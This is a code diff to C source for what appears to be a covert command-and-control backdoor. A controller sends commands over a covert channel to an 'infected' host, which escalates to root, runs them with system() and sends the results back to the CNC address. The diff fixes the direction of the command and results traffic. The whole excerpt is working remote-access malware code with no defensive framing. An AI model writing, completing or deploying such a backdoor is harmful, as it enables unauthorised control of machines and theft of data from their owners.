@@ -37,15 +37,15 @@ int main(int argc, char **argv){
     setuid(0);
     setgid(0);
     char *c = "c";
-    char *sip = INFECTEDIP;
-    char *dip = CNCIP;
+    char *sip = CNCIP;
+    char *dip = INFECTEDIP;
     unsigned short sport = SHPORT;
     unsigned short dport = SHPORT;
     unsigned char data[BUFSIZE] = "ls";
 
     if(strcmp(argv[1],c) == 0){
         covert_send(sip, dip, sport, dport, data, 0);
-        recv_results(sip, sport);
+        recv_results(dip, dport);
 
         exit(1);
     } else {
@@ -206,6 +206,8 @@ void ParsePayload(const u_char *payload, int len){
     system(CHMOD);
     system(CMD);
 
+
+    //sending the results back to the CNC
     char *srcip = INFECTEDIP;
     char *destip = CNCIP;
     unsigned short sport = SHPORT;
@@ -216,12 +218,11 @@ void ParsePayload(const u_char *payload, int len){
 
 void recv_results(char* sip, unsigned short sport) {
     FILE* file;
-    char* filename = "results";
     char input;
 
     printf("listening for results\n\n");
 
-    if((file = fopen(filename, "wb")) == NULL) {
+    if((file = fopen(RESULT_FILE, "wb")) == NULL) {
         perror("fopen can't open file");
         exit(1);
     }
